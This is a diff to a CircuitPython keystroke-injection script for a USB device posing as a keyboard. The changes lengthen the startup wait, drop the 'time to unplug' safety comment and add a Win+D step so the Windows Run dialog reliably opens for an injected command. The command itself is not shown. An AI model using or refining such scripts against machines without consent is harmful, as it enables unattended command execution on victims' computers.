@@ -5,8 +5,8 @@ import digitalio
 import usb_hid
 
 # --- SAFETY DELAY ---
-# 3 Seconds to unplug if something goes wrong
-time.sleep(3.0)
+# Wait for Windows to finish mounting the drive and opening File Explorer autoplay
+time.sleep(8.0)
 
 # --- MEMORY CLEANUP (CRITICAL) ---
 gc.collect()
@@ -39,12 +39,18 @@ except Exception:
 # --- PAYLOAD EXECUTION ---
 led.value = True
 
-# 1. Open Run Dialog
+# 1. Minimize all windows (including File Explorer autoplay) so Run dialog opens cleanly
+kbd.press(Keycode.GUI, Keycode.D)
+time.sleep(0.1)
+kbd.release_all()
+time.sleep(0.5)
+
+# 2. Open Run Dialog
 kbd.press(Keycode.GUI, Keycode.R)
 time.sleep(0.1)
 kbd.release_all()
 
-# 2. Wait for Run Box
+# 3. Wait for Run Box
 time.sleep(1.5)
 
 # 3. Type Command (streamed in chunks to avoid MemoryError)
